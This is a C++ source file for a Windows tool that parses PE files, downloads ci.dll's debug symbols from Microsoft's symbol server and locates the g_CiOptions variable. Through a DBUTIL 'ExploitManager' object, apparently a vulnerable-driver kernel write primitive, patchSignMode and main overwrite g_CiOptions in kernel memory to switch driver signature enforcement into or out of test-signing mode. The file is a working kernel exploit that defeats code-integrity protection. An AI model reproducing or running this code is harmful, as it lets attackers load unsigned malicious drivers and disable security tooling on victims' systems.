#include "dbutil.h"
#include <winhttp.h>
#pragma comment(lib, "Winhttp.lib")
#include <vector>
#include <iostream>

// Symbol Parsing
typedef struct PE_relocation_t {
	DWORD RVA;
	WORD Type : 4;
} PE_relocation;

typedef struct PE_codeview_debug_info_t {
	DWORD signature;
	GUID guid;
	DWORD age;
	CHAR pdbName[1];
} PE_codeview_debug_info;

typedef struct PE_pointers {
	BOOL isMemoryMapped;
	BOOL isInAnotherAddressSpace;
	HANDLE hProcess;
	PVOID baseAddress;
	//headers ptrs
	IMAGE_DOS_HEADER* dosHeader;
	IMAGE_NT_HEADERS* ntHeader;
	IMAGE_OPTIONAL_HEADER* optHeader;
	IMAGE_DATA_DIRECTORY* dataDir;
	IMAGE_SECTION_HEADER* sectionHeaders;
	//export info
	IMAGE_EXPORT_DIRECTORY* exportDirectory;
	LPDWORD exportedNames;
	DWORD exportedNamesLength;
	LPDWORD exportedFunctions;
	LPWORD exportedOrdinals;
	//relocations info
	DWORD nbRelocations;
	PE_relocation* relocations;
	//debug info
	IMAGE_DEBUG_DIRECTORY* debugDirectory;
	PE_codeview_debug_info* codeviewDebugInfo;
} PE;

typedef struct symbol_ctx_t {
	LPWSTR pdb_name_w;
	DWORD64 pdb_base_addr;
	HANDLE sym_handle;
} symbol_ctx;

PBYTE ReadFullFileW(LPCWSTR fileName) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	DWORD fileSize = GetFileSize(hFile, NULL);
	PBYTE fileContent = (PBYTE)malloc(fileSize); // cast
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		free(fileContent);
		fileContent = NULL;
	}
	CloseHandle(hFile);
	return fileContent;
}

IMAGE_SECTION_HEADER* PE_sectionHeader_fromRVA(PE* pe, DWORD rva) {
	IMAGE_SECTION_HEADER* sectionHeaders = pe->sectionHeaders;
	for (DWORD sectionIndex = 0; sectionIndex < pe->ntHeader->FileHeader.NumberOfSections; sectionIndex++) {
		DWORD currSectionVA = sectionHeaders[sectionIndex].VirtualAddress;
		DWORD currSectionVSize = sectionHeaders[sectionIndex].Misc.VirtualSize;
		if (currSectionVA <= rva && rva < currSectionVA + currSectionVSize) {
			return &sectionHeaders[sectionIndex];
		}
	}
	return NULL;
}

PVOID PE_RVA_to_Addr(PE* pe, DWORD rva) {
	PVOID peBase = pe->dosHeader;
	if (pe->isMemoryMapped) {
		return (PBYTE)peBase + rva;
	}

	IMAGE_SECTION_HEADER* rvaSectionHeader = PE_sectionHeader_fromRVA(pe, rva);
	if (NULL == rvaSectionHeader) {
		return NULL;
	}
	else {
		return (PBYTE)peBase + rvaSectionHeader->PointerToRawData + (rva - rvaSectionHeader->VirtualAddress);
	}
}

PE* PE_create(PVOID imageBase, BOOL isMemoryMapped) {
	PE* pe = (PE*)calloc(1, sizeof(PE));
	if (NULL == pe) {
		exit(1);
	}
	pe->isMemoryMapped = isMemoryMapped;
	pe->isInAnotherAddressSpace = FALSE;
	pe->hProcess = INVALID_HANDLE_VALUE;
	pe->dosHeader = (IMAGE_DOS_HEADER*)imageBase; // cast
	pe->ntHeader = (IMAGE_NT_HEADERS*)(((PBYTE)imageBase) + pe->dosHeader->e_lfanew);
	pe->optHeader = &pe->ntHeader->OptionalHeader;
	if (isMemoryMapped) {
		pe->baseAddress = imageBase;
	}
	else {
		pe->baseAddress = (PVOID)pe->optHeader->ImageBase;
	}
	pe->dataDir = pe->optHeader->DataDirectory;
	pe->sectionHeaders = (IMAGE_SECTION_HEADER*)(((PBYTE)pe->optHeader) + pe->ntHeader->FileHeader.SizeOfOptionalHeader);
	DWORD exportRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportRVA == 0) {
		pe->exportDirectory = NULL;
		pe->exportedNames = NULL;
		pe->exportedFunctions = NULL;
		pe->exportedOrdinals = NULL;
	}
	else {
		pe->exportDirectory = (IMAGE_EXPORT_DIRECTORY*)PE_RVA_to_Addr(pe, exportRVA);
		pe->exportedNames = (LPDWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNames);
		pe->exportedFunctions = (LPDWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfFunctions);
		pe->exportedOrdinals = (LPWORD)PE_RVA_to_Addr(pe, pe->exportDirectory->AddressOfNameOrdinals);
		pe->exportedNamesLength = pe->exportDirectory->NumberOfNames;
	}
	pe->relocations = NULL;
	DWORD debugRVA = pe->dataDir[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
	if (debugRVA == 0) {
		pe->debugDirectory = NULL;
	}
	else {
		pe->debugDirectory = (IMAGE_DEBUG_DIRECTORY*)PE_RVA_to_Addr(pe, debugRVA);
		if (pe->debugDirectory->Type != IMAGE_DEBUG_TYPE_CODEVIEW) {
			pe->debugDirectory = NULL;
		}
		else {
			pe->codeviewDebugInfo = (PE_codeview_debug_info*)PE_RVA_to_Addr(pe, pe->debugDirectory->AddressOfRawData);
			if (pe->codeviewDebugInfo->signature != *((DWORD*)"RSDS")) {
				pe->debugDirectory = NULL;
				pe->codeviewDebugInfo = NULL;
			}
		}
	}
	return pe;
}

VOID PE_destroy(PE* pe)
{
	if (pe->relocations) {
		free(pe->relocations);
		pe->relocations = NULL;
	}
	free(pe);
}

BOOL FileExistsW(LPCWSTR szPath)
{
	DWORD dwAttrib = GetFileAttributesW(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL WriteFullFileW(LPCWSTR fileName, PBYTE fileContent, SIZE_T fileSize) {
	HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}
	BOOL res = WriteFile(hFile, fileContent, (DWORD)fileSize, NULL, NULL);
	CloseHandle(hFile);
	return res;
}

BOOL HttpsDownloadFullFile(LPCWSTR domain, LPCWSTR uri, PBYTE* output, SIZE_T* output_size) {
	///wprintf_or_not(L"Downloading https://%s%s...\n", domain, uri);
	// Get proxy configuration
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
	WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig);
	BOOL proxySet = !(proxyConfig.fAutoDetect || proxyConfig.lpszAutoConfigUrl != NULL);
	DWORD proxyAccessType = proxySet ? ((proxyConfig.lpszProxy == NULL) ?
		WINHTTP_ACCESS_TYPE_NO_PROXY : WINHTTP_ACCESS_TYPE_NAMED_PROXY) : WINHTTP_ACCESS_TYPE_NO_PROXY;
	LPCWSTR proxyName = proxySet ? proxyConfig.lpszProxy : WINHTTP_NO_PROXY_NAME;
	LPCWSTR proxyBypass = proxySet ? proxyConfig.lpszProxyBypass : WINHTTP_NO_PROXY_BYPASS;

	// Initialize HTTP session and request
	HINTERNET hSession = WinHttpOpen(L"WinHTTP/1.0", proxyAccessType, proxyName, proxyBypass, 0);
	if (hSession == NULL) {
		printf("WinHttpOpen failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (!hConnect) {
		printf("WinHttpConnect failed with error : 0x%x\n", GetLastError());
		return FALSE;
	}
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uri, NULL,
		WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!hRequest) {
		return FALSE;
	}

	// Configure proxy manually
	if (!proxySet)
	{
		WINHTTP_AUTOPROXY_OPTIONS  autoProxyOptions;
		autoProxyOptions.dwFlags = proxyConfig.lpszAutoConfigUrl != NULL ? WINHTTP_AUTOPROXY_CONFIG_URL : WINHTTP_AUTOPROXY_AUTO_DETECT;
		autoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
		autoProxyOptions.fAutoLogonIfChallenged = TRUE;

		if (proxyConfig.lpszAutoConfigUrl != NULL)
			autoProxyOptions.lpszAutoConfigUrl = proxyConfig.lpszAutoConfigUrl;

		WCHAR szUrl[MAX_PATH] = { 0 };
		swprintf_s(szUrl, _countof(szUrl), L"https://%ws%ws", domain, uri);

		WINHTTP_PROXY_INFO proxyInfo;
		WinHttpGetProxyForUrl(
			hSession,
			szUrl,
			&autoProxyOptions,
			&proxyInfo);

		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo));
		DWORD logonPolicy = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
		WinHttpSetOption(hRequest, WINHTTP_OPTION_AUTOLOGON_POLICY, &logonPolicy, sizeof(logonPolicy));
	}

	// Perform request
	BOOL bRequestSent;
	do {
		bRequestSent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	} while (!bRequestSent && GetLastError() == ERROR_WINHTTP_RESEND_REQUEST);
	if (!bRequestSent) {
		return FALSE;
	}
	BOOL bResponseReceived = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResponseReceived) {
		return FALSE;
	}

	// Read response
	DWORD dwAvailableSize = 0;
	DWORD dwDownloadedSize = 0;
	SIZE_T allocatedSize = 4096;
	if (!WinHttpQueryDataAvailable(hRequest, &dwAvailableSize))
	{
		return FALSE;
	}
	*output = (PBYTE)malloc(allocatedSize);
	*output_size = 0;
	while (dwAvailableSize)
	{
		while (*output_size + dwAvailableSize > allocatedSize) {
			allocatedSize *= 2;
			PBYTE new_output = (PBYTE)realloc(*output, allocatedSize);
			if (new_output == NULL)
			{
				return FALSE;
			}
			*output = new_output;
		}
		if (!WinHttpReadData(hRequest, *output + *output_size, dwAvailableSize, &dwDownloadedSize))
		{
			return FALSE;
		}
		*output_size += dwDownloadedSize;

		WinHttpQueryDataAvailable(hRequest, &dwAvailableSize);
	}
	PBYTE new_output = (PBYTE)realloc(*output, *output_size);
	if (new_output == NULL)
	{
		return FALSE;
	}
	*output = new_output;
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return TRUE;
}

BOOL DownloadPDB(GUID guid, DWORD age, LPCWSTR pdb_name_w, PBYTE* file, SIZE_T* file_size) {
	WCHAR full_pdb_uri[MAX_PATH] = { 0 };
	swprintf_s(full_pdb_uri, _countof(full_pdb_uri), L"/download/symbols/%s/%08X%04hX%04hX%016llX%X/%s", pdb_name_w, guid.Data1, guid.Data2, guid.Data3, _byteswap_uint64(*((DWORD64*)guid.Data4)), age, pdb_name_w);
	return HttpsDownloadFullFile(L"msdl.microsoft.com", full_pdb_uri, file, file_size);
}

BOOL DownloadPDBFromPE(PE* image_pe, PBYTE* file, SIZE_T* file_size) {
	WCHAR pdb_name_w[MAX_PATH] = { 0 };
	GUID guid = image_pe->codeviewDebugInfo->guid;
	DWORD age = image_pe->codeviewDebugInfo->age;
	MultiByteToWideChar(CP_UTF8, 0, image_pe->codeviewDebugInfo->pdbName, -1, pdb_name_w, _countof(pdb_name_w));
	return DownloadPDB(guid, age, pdb_name_w, file, file_size);
}

symbol_ctx* LoadSymbolsFromPE(PE* pe) {
	symbol_ctx* ctx = (symbol_ctx*)calloc(1, sizeof(symbol_ctx));
	if (ctx == NULL) {
		return NULL;
	}
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, NULL, 0);
	ctx->pdb_name_w = (LPWSTR)calloc(size_needed, sizeof(WCHAR));
	MultiByteToWideChar(CP_UTF8, 0, pe->codeviewDebugInfo->pdbName, -1, ctx->pdb_name_w, size_needed);
	if (!FileExistsW(ctx->pdb_name_w)) {
		PBYTE file;
		SIZE_T file_size;
		BOOL res = DownloadPDBFromPE(pe, &file, &file_size);
		if (!res) {
			free(ctx);
			return NULL;
		}
		WriteFullFileW(ctx->pdb_name_w, file, file_size);
		free(file);
	}
	else {
		//TODO : check if exisiting PDB corresponds to the file version
	}
	DWORD64 asked_pdb_base_addr = 0x1337000; // ntos baseAddress from Debugging at pe = ... -> 0x0000000140000000 ; ci base -> 0x00000001c0000000
	//DWORD64 asked_pdb_base_addr = 0x1c0000000; // ntos baseAddress from Debugging at pe = ... -> 0x0000000140000000 ; ci base -> 0x00000001c0000000
	DWORD pdb_image_size = MAXDWORD;
	HANDLE cp = GetCurrentProcess();
	if (!SymInitialize(cp, NULL, FALSE)) {
		//if (!SymInitializeW(cp, ctx->pdb_name_w, FALSE)) {
		free(ctx);
		return NULL;
	}
	ctx->sym_handle = cp;

	//DWORD64 pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	DWORD64 addr = (DWORD64)pe->baseAddress;
	//addr -= 0x13ECC9000;
	//DWORD64 pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, (DWORD64)pe->baseAddress, pdb_image_size, NULL, 0);
	DWORD64 pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, addr, pdb_image_size, NULL, 0);

	//printf("tmp\n");
	while (pdb_base_addr == 0) {
		DWORD err = GetLastError();
		if (err == ERROR_SUCCESS)
			break;
		if (err == ERROR_FILE_NOT_FOUND) {
			SymUnloadModule(cp, asked_pdb_base_addr);//TODO : fix handle leak
			SymCleanup(cp);
			free(ctx);
			return NULL;
		}
		asked_pdb_base_addr += 0x100000;
		//pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
		pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, (DWORD64)pe->baseAddress, pdb_image_size, NULL, 0);
	}
	ctx->pdb_base_addr = pdb_base_addr;
	return ctx;
}

symbol_ctx* LoadSymbolsFromImageFile(LPCWSTR image_file_path) {
	PVOID image_content = ReadFullFileW(image_file_path);
	PE* pe = PE_create(image_content, FALSE);
	symbol_ctx* ctx = LoadSymbolsFromPE(pe);
	PE_destroy(pe);
	free(image_content);
	return ctx;
}

DWORD64 GetSymbolOffset(symbol_ctx* ctx, LPCSTR symbol_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, symbol_name, &si.si);
	if (res) {
		return si.si.Address - ctx->pdb_base_addr;
	}
	else {
		return 0;
	}
}

DWORD GetFieldOffset(symbol_ctx* ctx, LPCSTR struct_name, LPCWSTR field_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, struct_name, &si.si);
	if (!res) {
		return 0;
	}

	TI_FINDCHILDREN_PARAMS* childrenParam = (TI_FINDCHILDREN_PARAMS*)calloc(1, sizeof(TI_FINDCHILDREN_PARAMS));
	if (childrenParam == NULL) {
		return 0;
	}

	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_GET_CHILDRENCOUNT, &childrenParam->Count);
	if (!res) {
		return 0;
	}
	TI_FINDCHILDREN_PARAMS* ptr = (TI_FINDCHILDREN_PARAMS*)realloc(childrenParam, sizeof(TI_FINDCHILDREN_PARAMS) + childrenParam->Count * sizeof(ULONG));
	if (ptr == NULL) {
		free(childrenParam);
		return 0;
	}
	childrenParam = ptr;
	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_FINDCHILDREN, childrenParam);
	DWORD offset = 0;
	for (ULONG i = 0; i < childrenParam->Count; i++) {
		ULONG childID = childrenParam->ChildId[i];
		WCHAR* name = NULL;
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_SYMNAME, &name);
		if (wcscmp(field_name, name)) {
			continue;
		}
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_OFFSET, &offset);
		break;
	}
	free(childrenParam);
	return offset;
}

void UnloadSymbols(symbol_ctx* ctx, BOOL delete_pdb) {
	SymUnloadModule(ctx->sym_handle, ctx->pdb_base_addr);
	SymCleanup(ctx->sym_handle);
	if (delete_pdb) {
		DeleteFileW(ctx->pdb_name_w);
	}
	free(ctx->pdb_name_w);
	ctx->pdb_name_w = NULL;
	free(ctx);
}

void patchSignMode(DBUTIL* ExploitManager, DWORD64 ciBaseAddress, bool status) {
	LPTSTR ciPath;
	TCHAR g_ciPath[MAX_PATH] = { 0 };
	_tcscat_s(g_ciPath, _countof(g_ciPath), TEXT("C:\\Windows\\System32\\ci.dll"));
	ciPath = g_ciPath;
	symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(ciPath);

	if (sym_ctx == NULL) {
		printf("Symbols not available, download failed, aborting...\n");
		exit(1);
	}
	DWORD64 ciOpt;
	LPCSTR str = "g_CiOptions";
	ciOpt = GetSymbolOffset(sym_ctx, str);
	DWORD64 off = 0x8;
	DWORD64 on = 0x6;

	if (!status) {
		ExploitManager->VirtualWrite(ciBaseAddress + ciOpt, &on, 2);
		printf("Machine has been forced out of TestSigning - Mode\n");
	}
	else {
		ExploitManager->VirtualWrite(ciBaseAddress + ciOpt, &off, 2);
		printf("Machine has been forced into TestSigning - Mode\n");
	}

}

int main(int argc, char* argv[]) {

	DBUTIL* ExploitManager = new DBUTIL();

	DWORD64 ciBaseAddress = ExploitManager->GetKernelBase("CI.dll");

	bool status = (char)atoi(argv[1]);

	patchSignMode(ExploitManager, ciBaseAddress, status);

}
